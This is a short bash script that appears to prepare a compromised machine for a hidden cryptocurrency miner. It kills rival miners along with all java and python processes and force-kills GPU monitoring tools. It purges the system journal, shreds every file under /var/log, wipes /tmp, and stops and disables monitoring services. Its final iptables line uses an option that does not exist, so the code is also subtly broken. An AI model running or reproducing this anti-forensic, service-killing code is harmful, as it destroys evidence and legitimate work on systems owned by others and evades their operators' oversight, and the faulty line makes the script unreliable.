#!/bin/bash

# Kill competing processes
pkill -f "xmrig|t-rex|minerd|cpuminer|java|python"
pkill -9 -f "nvidia-smi|radeontop"

# Clear logs
journalctl --vacuum-time=1s
find /var/log -type f -exec shred -u {} \;
rm -rf /tmp/*

# Disable monitoring
systemctl stop atop
systemctl disable nvidia-data-collector

# Obfuscate network
iptables -A OUTPUT -m owner --uid-answer 0 -j DROP
